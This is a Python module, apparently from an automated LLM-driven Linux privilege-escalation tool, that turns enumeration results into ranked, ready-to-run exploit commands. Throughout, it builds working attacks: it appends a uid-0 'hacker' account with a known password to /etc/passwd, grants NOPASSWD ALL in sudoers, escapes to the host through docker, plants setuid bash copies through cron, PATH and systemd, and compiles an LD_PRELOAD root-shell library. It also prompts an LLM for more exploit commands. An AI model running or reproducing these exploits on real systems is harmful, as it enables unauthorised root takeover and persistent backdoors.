"""
CategoryMatcher: Maps enumeration results to ATT&CK categories + exploitation strategies.

Two-layer matching:
  1. Rule-based: regex matching SUID/sudo binaries → GTFOBins lookup (zero LLM)
  2. LLM fallback: for complex/ambiguous cases (1 LLM call)
"""

import json
import os
import re
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional

from .privenum import EnumReport

KNOWLEDGE_DIR = Path(__file__).parent.parent / "knowledge"


@dataclass
class ExploitCandidate:
    """A candidate exploitation strategy."""
    category: str           # ATT&CK sub-technique or vuln class
    binary: str             # Target binary or service
    exploit_cmd: str        # Primary exploit command
    confidence: float       # 0.0-1.0
    source: str             # "rule" or "llm"
    multi_step: bool = False  # Requires StepPlanner
    notes: str = ""


class CategoryMatcher:
    """
    Maps PrivEnum report to ranked exploitation candidates.

    Uses GTFOBins knowledge base for rule matching, falls back to LLM
    for cases that require reasoning (e.g., cron job analysis, path injection).
    """

    # GTFOBins function priority: prefer shell > suid > sudo > file-write > file-read
    _FUNCTION_PRIORITY = {
        "shell": 0, "suid": 1, "sudo": 2,
        "file-write": 3, "file-read": 4,
        "command": 5, "non-interactive-bind-shell": 6,
        "reverse-shell": 7, "non-interactive-reverse-shell": 8,
    }

    def __init__(self, gtfobins_path: Optional[str] = None):
        db_path = gtfobins_path or str(KNOWLEDGE_DIR / "gtfobins_db.json")
        if os.path.exists(db_path):
            with open(db_path) as f:
                self._gtfobins = json.load(f)
        else:
            self._gtfobins = {}

    @staticmethod
    def _resolve_placeholders(code: str, binary_path: str = "") -> str:
        """Replace GTFOBins placeholder paths with concrete values for exploitation."""
        replacements = {
            "/path/to/input-file": "/etc/shadow",
            "/path/to/output-file": "/etc/passwd",
            "/path/to/temp-file": "/tmp/pe_temp",
            "/path/to/lib.so": "/tmp/pe.so",
            "./relative/path": "/tmp",
            "attacker.com": "127.0.0.1",
            "http://attacker.com": "http://127.0.0.1",
        }
        result = code
        for placeholder, value in replacements.items():
            result = result.replace(placeholder, value)
        # Replace binary name placeholder if present
        if binary_path:
            result = result.replace("./binary", binary_path)
        return result

    def _pick_best_technique(self, techniques: list) -> dict:
        """Select the best technique from a GTFOBins entry, preferring shell functions."""
        if not techniques:
            return {}
        # Sort by function priority (shell first)
        def priority(t):
            fn = t.get("function", "")
            return self._FUNCTION_PRIORITY.get(fn, 99)
        return min(techniques, key=priority)

    def _lookup_gtfobins(self, binary_name: str) -> tuple:
        """Lookup binary in GTFOBins DB with fallback for name variants."""
        if binary_name in self._gtfobins:
            return binary_name, self._gtfobins[binary_name]
        # Try underscore → hyphen (e.g., ssh_keygen → ssh-keygen)
        alt = binary_name.replace("_", "-")
        if alt in self._gtfobins:
            return alt, self._gtfobins[alt]
        # Try hyphen → underscore
        alt2 = binary_name.replace("-", "_")
        if alt2 in self._gtfobins:
            return alt2, self._gtfobins[alt2]
        return None, {}

    def rule_match(self, report: EnumReport) -> List[ExploitCandidate]:
        """
        Rule-based matching: deterministic, zero LLM calls.
        Returns candidates sorted by confidence (descending).
        """
        candidates = []

        # 1. Sudo NOPASSWD → highest confidence
        candidates.extend(self._match_sudo(report))

        # 2. SUID binaries → GTFOBins lookup
        candidates.extend(self._match_suid(report))

        # 3. Capabilities → targeted check
        candidates.extend(self._match_capabilities(report))

        # 4. Cron jobs → pattern detection (multi-step)
        candidates.extend(self._match_cron(report))

        # 5. Writable sensitive files
        candidates.extend(self._match_writable(report))

        # 6. Docker group / socket access
        candidates.extend(self._match_docker(report))

        # 7. SSH key abuse
        candidates.extend(self._match_ssh_keys(report))

        # 8. LD_PRELOAD / library hijacking
        candidates.extend(self._match_ld_preload(report))

        # 9. PATH hijacking (writable PATH dirs)
        candidates.extend(self._match_path_hijack(report))

        # 10. Credential leakage (history, env, config files)
        candidates.extend(self._match_credentials(report))

        # 11. Systemd timer exploitation
        candidates.extend(self._match_systemd(report))

        # Sort by confidence descending
        candidates.sort(key=lambda c: c.confidence, reverse=True)
        return candidates

    def _match_sudo(self, report: EnumReport) -> List[ExploitCandidate]:
        """Match sudo NOPASSWD entries against GTFOBins."""
        candidates = []

        # Parse sudo -l output for allowed commands
        sudo_text = report.sudo_privs
        if not sudo_text or "not allowed" in sudo_text.lower():
            return candidates

        # Extract binary paths from sudo output
        # Pattern: (root) NOPASSWD: /usr/bin/vim
        # Pattern: (ALL) NOPASSWD: ALL
        for line in sudo_text.splitlines():
            line = line.strip()

            # ALL privilege
            if re.search(r'NOPASSWD.*:\s*ALL\s*$', line):
                candidates.append(ExploitCandidate(
                    category="T1548.003_sudo_all",
                    binary="sudo",
                    exploit_cmd="sudo su -",
                    confidence=1.0,
                    source="rule",
                    notes="NOPASSWD ALL — trivial escalation"
                ))
                continue

            # Specific binary
            matches = re.findall(r'NOPASSWD:\s*(.+)', line)
            for match in matches:
                for cmd_part in match.split(","):
                    cmd_part = cmd_part.strip()
                    # Extract binary name from path
                    binary_path = cmd_part.split()[0] if cmd_part else ""
                    binary_name = os.path.basename(binary_path)

                    db_name, entry = self._lookup_gtfobins(binary_name)
                    if entry:
                        sudo_techs = entry.get("techniques", {}).get("sudo", [])
                        if sudo_techs:
                            best = self._pick_best_technique(sudo_techs)
                            fn = best.get("function", "")
                            code = self._resolve_placeholders(best["code"], binary_path)
                            is_shell = fn == "shell"
                            if not is_shell:
                                pw = "/etc/passwd" in report.writable_files
                                code, notes = self._build_indirect_exploit(binary_name, binary_path, fn, code, passwd_writable=pw)
                                candidates.append(ExploitCandidate(
                                    category="T1548.003_sudo",
                                    binary=binary_name,
                                    exploit_cmd=code,
                                    confidence=0.80,
                                    source="rule",
                                    multi_step=True,
                                    notes=notes,
                                ))
                            else:
                                code = self._fix_interactive_shell(code, binary_path)
                                candidates.append(ExploitCandidate(
                                    category="T1548.003_sudo",
                                    binary=binary_name,
                                    exploit_cmd=code,
                                    confidence=0.95,
                                    source="rule",
                                    notes=f"GTFOBins sudo/{fn} — direct shell",
                                ))
                    elif binary_name:
                        # Unknown binary with sudo — try generic approach
                        candidates.append(ExploitCandidate(
                            category="T1548.003_sudo",
                            binary=binary_name,
                            exploit_cmd=f"sudo {binary_path}",
                            confidence=0.5,
                            source="rule",
                            notes="Unknown binary with sudo NOPASSWD"
                        ))

        return candidates

    def _match_suid(self, report: EnumReport) -> List[ExploitCandidate]:
        """Match SUID binaries against GTFOBins knowledge base."""
        candidates = []
        for suid_path in report.suid_binaries:
            binary_name = os.path.basename(suid_path)
            db_name, entry = self._lookup_gtfobins(binary_name)
            if entry:
                suid_techs = entry.get("techniques", {}).get("suid", [])
                if suid_techs:
                    best = self._pick_best_technique(suid_techs)
                    fn = best.get("function", "")
                    code = self._resolve_placeholders(best["code"], suid_path)
                    is_shell = fn == "shell"
                    # Non-shell functions (file-read, download, etc.) need multi-step approach
                    if not is_shell:
                        pw = "/etc/passwd" in report.writable_files
                        code, notes = self._build_indirect_exploit(binary_name, suid_path, fn, code, passwd_writable=pw)
                        candidates.append(ExploitCandidate(
                            category="T1548.001_suid",
                            binary=binary_name,
                            exploit_cmd=code,
                            confidence=0.75,
                            source="rule",
                            multi_step=True,
                            notes=notes,
                        ))
                    else:
                        # Fix interactive shells for non-interactive SSH execution
                        code = self._fix_interactive_shell(code, suid_path)
                        candidates.append(ExploitCandidate(
                            category="T1548.001_suid",
                            binary=binary_name,
                            exploit_cmd=code,
                            confidence=0.90,
                            source="rule",
                            notes=f"GTFOBins suid/{fn} — direct shell at {suid_path}",
                        ))
        return candidates

    @staticmethod
    def _fix_interactive_shell(code: str, binary_path: str) -> str:
        """Convert interactive shell commands to non-interactive for SSH execution.

        SSH agents execute each command in a separate channel, so spawning an
        interactive shell doesn't persist. We convert to commands that create
        persistent root access (new user in /etc/passwd).
        """
        code = code.strip()

        # Multi-line commands (vim escape, ftp !/bin/sh, etc.) — can't fix
        if '\n' in code:
            return code

        # Already working non-interactive patterns — don't touch
        if '-exec ' in code or 'xargs ' in code:
            return code

        passwd_line = 'hacker:aa1q.me8iQH8M:0:0:root:/root:/bin/bash'
        hint = '\n# Then run: su hacker  (password: hacker)'
        shells = ['/bin/sh', '/bin/bash', '/bin/dash', '/bin/ash', '/bin/zsh', '/bin/csh']

        # --- Pattern 1: ends with '/bin/sh [-p]' ---
        for sh in shells:
            for suffix in [f'{sh} -p ', f'{sh} -p', f'{sh} ', sh]:
                if code.rstrip().endswith(suffix.rstrip()):
                    prefix = code.rstrip()
                    return f'{prefix} -c \'echo "{passwd_line}" >> /etc/passwd\'{hint}'

        # --- Pattern 2: 'binary -p' (the binary itself is a shell) ---
        if code.endswith(' -p') and len(code.split()) <= 2:
            return f'{code} -c \'echo "{passwd_line}" >> /etc/passwd\'{hint}'

        # --- Pattern 3: system("/bin/sh") → system("cmd") ---
        # mawk 'BEGIN {system("/bin/sh")}'
        for sh in shells:
            if f'system("{sh}")' in code:
                return code.replace(f'system("{sh}")',
                    f'system("echo {passwd_line} >> /etc/passwd")') + hint
            if f"system('{sh}')" in code:
                return code.replace(f"system('{sh}')",
                    f'system("echo {passwd_line} >> /etc/passwd")') + hint

        # --- Pattern 4: exec /bin/sh → exec cmd ---
        # sed -n '1e exec /bin/sh 1>&0' /etc/hosts
        for sh in shells:
            if f'exec {sh}' in code:
                return code.replace(f'exec {sh}',
                    f'exec echo "{passwd_line}" >> /etc/passwd') + hint

        # --- Pattern 5: .shell /bin/sh → .shell cmd ---
        # sqlite3 /dev/null '.shell /bin/sh'
        for sh in shells:
            if f'.shell {sh}' in code:
                return code.replace(f'.shell {sh}',
                    f'.shell echo "{passwd_line}" >> /etc/passwd') + hint

        # --- Pattern 6: program -c /bin/sh (tmate, etc.) ---
        # tmate -c /bin/sh → tmate -c 'echo ... >> /etc/passwd'
        for sh in shells:
            for pat in [f'-c {sh}', f"-c '{sh}'", f'-c "{sh}"']:
                if pat in code:
                    return code.replace(pat,
                        f"-c 'echo \"{passwd_line}\" >> /etc/passwd'") + hint

        # --- Pattern 7: !/bin/sh (program shell escape, single-line) ---
        for sh in shells:
            if f'!{sh}' in code:
                return code.replace(f'!{sh}',
                    f'!echo "{passwd_line}" >> /etc/passwd') + hint

        # --- Pattern 8: 'binary' alone ---
        binary_name = os.path.basename(binary_path)
        shell_names = {'sh', 'bash', 'dash', 'ash', 'zsh', 'csh', 'ksh', 'fish'}
        if code.strip() in shell_names or code.strip().endswith(f'/{binary_name}'):
            return f'{code.strip()} -p -c \'echo "{passwd_line}" >> /etc/passwd\'{hint}'

        return code

    @staticmethod
    def _build_indirect_exploit(binary: str, path: str, fn: str, raw_code: str,
                                passwd_writable: bool = False) -> tuple:
        """Build a multi-step exploit description for non-shell GTFOBins functions."""
        if fn in ("file-read", "download"):
            if passwd_writable:
                code = (
                    "# /etc/passwd IS writable — direct write:\n"
                    "echo 'hacker:aa1q.me8iQH8M:0:0:root:/root:/bin/bash' >> /etc/passwd\n"
                    "su hacker  # password: hacker"
                )
                notes = f"GTFOBins suid/{fn} at {path} — /etc/passwd writable, direct write"
            else:
                code = (
                    f"# /etc/passwd is NOT writable. Use SUID {binary} to read /etc/shadow:\n"
                    f"{raw_code}\n"
                    f"# Extract the root password hash from the output.\n"
                    f"# Recover the hash offline, then use the recovered password with su root.\n"
                    f"# Or try writing passwd if permissions allow:\n"
                    f"echo 'hacker:aa1q.me8iQH8M:0:0:root:/root:/bin/bash' >> /etc/passwd 2>/dev/null && su hacker"
                )
                notes = f"GTFOBins suid/{fn} at {path} — read shadow + try su"
        elif fn == "file-write":
            code = (
                f"# Step 1: Write new root user to /etc/passwd using SUID {binary}\n"
                f"# DES hash of 'hacker' = aa1q.me8iQH8M (no openssl needed)\n"
                f"echo \"hacker:aa1q.me8iQH8M:0:0:root:/root:/bin/bash\" | {raw_code}\n"
                f"# Step 3: Switch to new root user\n"
                f"su hacker  # password: hacker"
            )
            notes = f"GTFOBins suid/{fn} at {path} — write passwd → su"
        else:
            code = raw_code
            notes = f"GTFOBins suid/{fn} at {path}"
        return code, notes

    def _match_capabilities(self, report: EnumReport) -> List[ExploitCandidate]:
        """Match Linux capabilities."""
        candidates = []
        for path, cap_str in report.capabilities.items():
            binary_name = os.path.basename(path)

            # cap_setuid is the most exploitable
            if "cap_setuid" in cap_str:
                db_name, entry = self._lookup_gtfobins(binary_name)
                if entry:
                    cap_techs = entry.get("techniques", {}).get("capabilities", [])
                    if cap_techs:
                        best = self._pick_best_technique(cap_techs)
                        code = self._resolve_placeholders(best["code"], path)
                        candidates.append(ExploitCandidate(
                            category="T1548.capabilities",
                            binary=binary_name,
                            exploit_cmd=code,
                            confidence=0.90,
                            source="rule",
                            notes=f"cap_setuid on {path}"
                        ))
                        continue

                # Generic cap_setuid exploit for Python/Perl/etc.
                if "python" in binary_name:
                    candidates.append(ExploitCandidate(
                        category="T1548.capabilities",
                        binary=binary_name,
                        exploit_cmd=f"{path} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                        confidence=0.90,
                        source="rule",
                        notes=f"cap_setuid on {path}"
                    ))
                elif "perl" in binary_name:
                    candidates.append(ExploitCandidate(
                        category="T1548.capabilities",
                        binary=binary_name,
                        exploit_cmd=f"{path} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
                        confidence=0.90,
                        source="rule",
                        notes=f"cap_setuid on {path}"
                    ))

            # cap_dac_read_search — can read /etc/shadow
            if "cap_dac_read_search" in cap_str:
                candidates.append(ExploitCandidate(
                    category="T1548.capabilities",
                    binary=binary_name,
                    exploit_cmd=f"{path} /etc/shadow",
                    confidence=0.60,
                    source="rule",
                    multi_step=True,
                    notes="cap_dac_read_search — read shadow, crack, su"
                ))

        return candidates

    def _match_cron(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect exploitable cron jobs (multi-step)."""
        candidates = []
        cron_text = report.cron_jobs
        if not cron_text:
            return candidates

        # Look for writable cron scripts
        writable_set = set(report.writable_files)
        for line in cron_text.splitlines():
            line = line.strip()
            if line.startswith("#") or not line:
                continue
            # Extract script paths from cron entries
            # Format: * * * * * root /path/to/script.sh
            parts = line.split()
            if len(parts) >= 6:
                # The command part starts after the timing fields (5) + optional user
                cmd_parts = parts[5:]  # skip timing
                if cmd_parts and cmd_parts[0] == "root":
                    cmd_parts = cmd_parts[1:]
                for part in cmd_parts:
                    if part.startswith("/") and part in writable_set:
                        candidates.append(ExploitCandidate(
                            category="T1053.003_cron",
                            binary=part,
                            exploit_cmd=f'echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> {part}',
                            confidence=0.80,
                            source="rule",
                            multi_step=True,
                            notes=f"Writable cron script: {part}"
                        ))

        return candidates

    def _match_writable(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect writable sensitive files."""
        candidates = []
        sensitive_patterns = {
            "/etc/passwd": ("T1078_passwd_write", "echo 'hacker:aa1q.me8iQH8M:0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker", 0.90),
            "/etc/shadow": ("T1078_shadow_write", "# Replace root password hash in /etc/shadow", 0.80),
            "/etc/sudoers": (
                "T1548.003_sudoers_write",
                "printf '%s ALL=(ALL) NOPASSWD: ALL\\n' \"$(id -un)\" >> /etc/sudoers",
                0.95,
            ),
        }
        for wf in report.writable_files:
            for pattern, (cat, cmd, conf) in sensitive_patterns.items():
                if wf == pattern or wf.endswith(pattern):
                    candidates.append(ExploitCandidate(
                        category=cat,
                        binary=pattern,
                        exploit_cmd=cmd,
                        confidence=conf,
                        source="rule",
                        notes=f"Writable: {wf}"
                    ))
        return candidates

    def _match_docker(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect Docker group membership or socket access."""
        candidates = []
        # Check group membership
        if "docker" in report.groups:
            candidates.append(ExploitCandidate(
                category="T1611_docker_escape",
                binary="docker",
                exploit_cmd='docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
                confidence=0.95,
                source="rule",
                multi_step=True,
                notes="User in docker group — mount host filesystem"
            ))
        # Check docker socket access from PrivEnum output
        docker_info = report.raw_outputs.get("docker", "")
        if "docker.sock" in docker_info and report.raw_outputs.get("docker_accessible") == "true":
            if not any(c.category == "T1611_docker_escape" for c in candidates):
                candidates.append(ExploitCandidate(
                    category="T1611_docker_escape",
                    binary="docker",
                    exploit_cmd='docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
                    confidence=0.90,
                    source="rule",
                    multi_step=True,
                    notes="Docker socket accessible at /var/run/docker.sock"
                ))
        return candidates

    def _match_ssh_keys(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect readable SSH private keys for privileged accounts."""
        candidates = []
        ssh_info = report.raw_outputs.get("ssh_keys", "")
        if not ssh_info:
            return candidates
        # Readable private key found
        if "BEGIN" in ssh_info or "id_rsa" in ssh_info or "id_ed25519" in ssh_info:
            # Determine target — check if root's key is readable
            if "/root/.ssh/" in ssh_info:
                candidates.append(ExploitCandidate(
                    category="T1098.004_ssh_key",
                    binary="ssh",
                    exploit_cmd="cat /root/.ssh/id_rsa > /tmp/rootkey && chmod 600 /tmp/rootkey && ssh -i /tmp/rootkey root@localhost",
                    confidence=0.85,
                    source="rule",
                    multi_step=True,
                    notes="Root SSH private key readable"
                ))
            else:
                # Other user's key — may allow lateral movement
                candidates.append(ExploitCandidate(
                    category="T1098.004_ssh_key",
                    binary="ssh",
                    exploit_cmd="# Copy readable SSH key and use to access target account",
                    confidence=0.60,
                    source="rule",
                    multi_step=True,
                    notes=f"SSH key material found: {ssh_info[:100]}"
                ))
        return candidates

    def _match_ld_preload(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect LD_PRELOAD exploitation opportunities."""
        candidates = []
        sudo_text = report.sudo_privs
        # LD_PRELOAD with sudo — classic privesc
        if sudo_text and "env_keep" in sudo_text.lower() and "LD_PRELOAD" in sudo_text:
            candidates.append(ExploitCandidate(
                category="T1574_library_hijack",
                binary="ld_preload",
                exploit_cmd=(
                    'echo \'#include <stdio.h>\\n#include <stdlib.h>\\n'
                    'void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash"); }\' '
                    '> /tmp/pe.c && gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c && '
                    'sudo LD_PRELOAD=/tmp/pe.so <allowed_binary>'
                ),
                confidence=0.90,
                source="rule",
                multi_step=True,
                notes="LD_PRELOAD preserved in sudo env_keep"
            ))
        # /etc/ld.so.preload writable
        if "/etc/ld.so.preload" in report.writable_files:
            candidates.append(ExploitCandidate(
                category="T1574_library_hijack",
                binary="ld.so.preload",
                exploit_cmd="# Compile malicious .so and write path to /etc/ld.so.preload",
                confidence=0.85,
                source="rule",
                multi_step=True,
                notes="Writable /etc/ld.so.preload"
            ))
        return candidates

    def _match_path_hijack(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect PATH variable hijacking opportunities."""
        candidates = []
        writable_dirs = report.raw_outputs.get("writable_path_dirs", [])
        if not writable_dirs or not isinstance(writable_dirs, list):
            return candidates
        # Writable PATH dir + SUID or cron using relative paths
        for wd in writable_dirs:
            candidates.append(ExploitCandidate(
                category="T1574_path_hijack",
                binary="PATH",
                exploit_cmd=f'echo -e "#!/bin/bash\\ncp /bin/bash /tmp/bash && chmod +s /tmp/bash" > {wd}/<target_cmd> && chmod +x {wd}/<target_cmd>',
                confidence=0.60,
                source="rule",
                multi_step=True,
                notes=f"Writable PATH directory: {wd} — place malicious binary to intercept relative command calls"
            ))
        return candidates

    def _match_credentials(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect credential leakage in history, environment, or config files."""
        candidates = []
        # Check bash history for passwords
        history = report.interesting_history
        if history:
            # Look for su/sudo with inline passwords, mysql -p, ssh with passwords
            password_patterns = [
                (r'su\s+root', "su root command in history"),
                (r'sudo\s+.*-S', "sudo with stdin password in history"),
                (r'mysql\s+.*-p\S+', "MySQL password in history"),
                (r'sshpass\s+', "sshpass with password in history"),
                (r'echo\s+.*\|\s*su', "piped password to su in history"),
                (r'passwd\s+', "passwd command in history"),
            ]
            for pattern, note in password_patterns:
                if re.search(pattern, history, re.IGNORECASE):
                    candidates.append(ExploitCandidate(
                        category="T1552.003_bash_history",
                        binary="bash_history",
                        exploit_cmd="# Extract credentials from bash history and use su/ssh",
                        confidence=0.75,
                        source="rule",
                        multi_step=True,
                        notes=note
                    ))
                    break  # one match is enough

        # Check passwords_found (from PrivEnum DB creds, SSH keys)
        if report.passwords_found:
            pwd_text = report.passwords_found.lower()
            if "password" in pwd_text or "credential" in pwd_text or "db " in pwd_text:
                candidates.append(ExploitCandidate(
                    category="T1078_info_disclosure",
                    binary="credentials",
                    exploit_cmd="# Use discovered credentials with su or ssh",
                    confidence=0.70,
                    source="rule",
                    multi_step=True,
                    notes=f"Credentials found: {report.passwords_found[:100]}"
                ))

        # Check environment variables for leaked secrets
        for key, val in report.env_vars.items():
            key_lower = key.lower()
            if any(s in key_lower for s in ["password", "passwd", "secret", "token", "api_key"]):
                candidates.append(ExploitCandidate(
                    category="T1078_info_disclosure",
                    binary="env",
                    exploit_cmd=f"# Password found in environment: {key}=***",
                    confidence=0.70,
                    source="rule",
                    notes=f"Sensitive env var: {key}"
                ))
                break  # one is enough

        return candidates

    def _match_systemd(self, report: EnumReport) -> List[ExploitCandidate]:
        """Detect exploitable systemd timers or writable service units."""
        candidates = []
        timers = report.raw_outputs.get("systemd_timers", "")
        if not timers:
            return candidates
        # Check for writable service/timer files
        writable_set = set(report.writable_files)
        for wf in writable_set:
            if wf.endswith(".service") or wf.endswith(".timer"):
                candidates.append(ExploitCandidate(
                    category="T1053.003_cron",
                    binary=os.path.basename(wf),
                    exploit_cmd=f'echo -e "[Service]\\nExecStart=/bin/bash -c \\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\\"" > {wf}',
                    confidence=0.75,
                    source="rule",
                    multi_step=True,
                    notes=f"Writable systemd unit: {wf}"
                ))
        return candidates

    def build_llm_prompt(self, report: EnumReport, rule_candidates: List[ExploitCandidate]) -> str:
        """
        Build the LLM prompt for cases where rule matching is insufficient.
        Returns the prompt text to be sent to the LLM.
        """
        existing = ""
        if rule_candidates:
            existing = "Rule-based matching already found:\n"
            for c in rule_candidates[:3]:
                existing += f"  - {c.category}: {c.binary} (confidence={c.confidence})\n"
            existing += "\nLook for ADDITIONAL attack vectors not covered above.\n"

        return f"""You are a Linux privilege escalation expert. Analyze the following enumeration report and identify the top-3 most promising privilege escalation strategies.

{report.to_text()}

{existing}
For each strategy, output a JSON array of objects with these fields:
- "category": ATT&CK technique ID or vulnerability class
- "binary": target binary or service name
- "exploit_cmd": the primary exploitation command
- "confidence": float 0.0-1.0
- "multi_step": boolean, true if requires multiple steps
- "notes": brief explanation

Output ONLY the JSON array, no other text."""
